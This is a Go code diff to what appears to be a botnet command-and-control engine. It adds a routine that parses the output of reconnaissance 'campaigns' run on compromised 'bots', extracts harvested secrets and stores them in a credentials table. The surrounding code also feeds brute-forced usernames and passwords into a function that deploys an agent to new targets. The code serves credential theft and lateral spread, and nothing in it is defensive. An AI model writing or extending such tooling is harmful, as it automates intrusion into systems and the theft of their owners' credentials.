@@ -259,6 +259,9 @@ func (e *Engine) syncResults(campID, campType string) {
 		if campType == models.CampaignTypeBrute && r.status == models.StatusCompleted {
 			go e.parseBruteResults(campID, r.botID, r.output)
 		}
+		if campType == models.CampaignTypeRecon && (r.status == models.StatusCompleted || r.status == models.StatusFailed) && r.output != "" {
+			go e.parseReconSecrets(campID, r.botID, r.output)
+		}
 	}
 }
 
@@ -301,6 +304,50 @@ func (e *Engine) parseBruteResults(campID, botID, output string) {
 
 		e.deployAgent(campID, botID, username, password, target, port)
 	}
+}
+
+func (e *Engine) parseReconSecrets(campID, botID, output string) {
+	var configJSON string
+	e.db.QueryRow(`SELECT config FROM campaigns WHERE id = $1`, campID).Scan(&configJSON)
+	if configJSON != "" {
+		var cfg reconConfig
+		if err := json.Unmarshal([]byte(configJSON), &cfg); err == nil {
+			if cfg.AutoExtract != nil && !*cfg.AutoExtract {
+				return
+			}
+		}
+	}
+
+	var hostname string
+	e.db.QueryRow(`SELECT COALESCE(hostname, '') FROM bots WHERE id = $1`, botID).Scan(&hostname)
+
+	secrets := ParseReconSecrets(output, botID, campID, hostname)
+	if len(secrets) == 0 {
+		return
+	}
+
+	inserted := 0
+	for _, s := range secrets {
+		result, err := e.db.Exec(`
+			INSERT INTO credentials (username, password, target, port, service, category, valid, bot_id, campaign_id, source_path)
+			VALUES ($1, $2, $3, $4, $5, $6, false, $7, $8, $9)
+			ON CONFLICT (username, target, port, service, category) DO NOTHING`,
+			s.Username, s.Password, s.Target, s.Port, s.Service, s.Category,
+			nilIfEmpty(s.BotID), nilIfEmpty(s.CampaignID), nilIfEmpty(s.SourcePath))
+		if err == nil {
+			if rows, _ := result.RowsAffected(); rows > 0 {
+				inserted++
+			}
+		}
+	}
+	log.Printf("[+] Campaign %s: extracted %d secrets from %s (%d new)", campID[:8], len(secrets), hostname, inserted)
+}
+
+func nilIfEmpty(s string) interface{} {
+	if s == "" {
+		return nil
+	}
+	return s
 }
 
 func (e *Engine) deployAgent(campID, botID, user, pass, target, port string) {
